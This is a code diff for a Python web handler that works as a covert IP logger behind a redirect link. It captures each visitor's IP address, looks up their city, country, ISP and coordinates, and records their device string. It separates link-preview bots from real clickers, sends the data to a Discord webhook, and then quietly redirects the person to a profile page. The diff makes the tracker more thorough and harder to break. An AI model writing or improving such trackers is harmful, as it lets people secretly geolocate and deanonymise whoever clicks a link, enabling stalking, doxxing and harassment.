@@ -2,50 +2,54 @@ from http.server import BaseHTTPRequestHandler
 import requests
 import json
 
-# Replace with your actual Discord Webhook URL
+# 1. PASTE YOUR WEBHOOK LINK BELOW
 WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
 REDIRECT_URL = "https://guns.lol/sleezyyyyyy"
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        user_agent = self.headers.get('User-Agent', '')
+        ua = self.headers.get('User-Agent', '')
         ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
         
-        # Check if it's just a Discord preview bot or a real person
-        is_bot = "Discordbot" in user_agent or "TelegramBot" in user_agent
+        # Detect if it's just Discord/Telegram showing a preview
+        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "Twitterbot"])
         
+        # Get geo data (Coordinates, ISP, etc.)
         try:
-            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
-            location = f"{geo.get('city')}, {geo.get('country')}"
-            coords = f"{geo.get('lat')}, {geo.get('lon')}"
+            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
+            city = geo.get('city', 'Unknown')
+            country = geo.get('country', 'Unknown')
+            isp = geo.get('isp', 'Unknown')
+            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
         except:
-            location = coords = "Unknown"
+            city = country = isp = coords = "Error fetching data"
 
-        if is_bot:
-            # Alert: The link was just sent/previewed
-            title = "📤 Link Sent / Previewed"
-            color = 3447003 # Blue
-        else:
-            # Alert: A real person clicked it
-            title = "🎯 New Visitor Logged!"
-            color = 16711680 # Red
+        # Determine which alert to send
+        title = "📤 Link Sent / Previewed" if is_bot else "🎯 New Visitor Logged!"
+        color = 3447003 if is_bot else 16711680
 
-        data = {
+        # Build the detailed embed
+        payload = {
             "embeds": [{
                 "title": title,
                 "color": color,
                 "fields": [
-                    {"name": "🌐 IP Address", "value": ip, "inline": True},
-                    {"name": "📍 Location", "value": location, "inline": True},
+                    {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
+                    {"name": "📍 Location", "value": f"{city}, {country}", "inline": True},
+                    {"name": "🏢 ISP/Provider", "value": isp, "inline": False},
                     {"name": "🗺️ Coordinates", "value": coords, "inline": False},
-                    {"name": "📱 Device", "value": user_agent[:250], "inline": False}
+                    {"name": "📱 Device Info", "value": f"```{ua[:200]}```", "inline": False}
                 ],
                 "footer": {"text": "Guns.lol Redirect Logger"}
             }]
         }
 
-        requests.post(WEBHOOK_URL, json=data)
-        
+        # Send to Discord
+        try:
+            requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        except:
+            pass # Prevent site crash if Discord is down
+
         # Always redirect the user
         self.send_response(302)
         self.send_header('Location', REDIRECT_URL)
